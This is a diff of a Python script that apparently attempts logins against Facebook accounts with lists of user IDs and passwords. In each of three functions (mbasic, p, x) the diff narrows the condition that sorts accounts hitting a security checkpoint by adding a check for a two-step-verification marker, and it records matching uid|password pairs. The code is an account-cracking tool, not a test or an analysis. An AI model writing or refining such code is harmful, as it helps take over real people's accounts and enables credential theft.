@@ -1355,7 +1355,7 @@ def mbasic(uid,pwx,tl):
                         return True 
                 else:
                    continue
-            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
+            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', '') and "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                 bkas.append(uid)
                 if len(bkas)% 2 == 0:
                     statusok = (f"{uid}|{pw}")
@@ -1442,7 +1442,7 @@ def p(uid,pwx,tl):
                         return True 
                 else:
                    continue
-            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
+            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', '') and "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                 bkas.append(uid)
                 if len(bkas)% 2 == 0:
                     statusok = (f"{uid}|{pw}")
@@ -1586,7 +1586,7 @@ def x(uid,pwx,tl):
                         return True 
                 else:
                    continue
-            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
+            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', '') and "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                 bkas.append(uid)
                 if len(bkas)% 2 == 0:
                     statusok = (f"{uid}|{pw}")
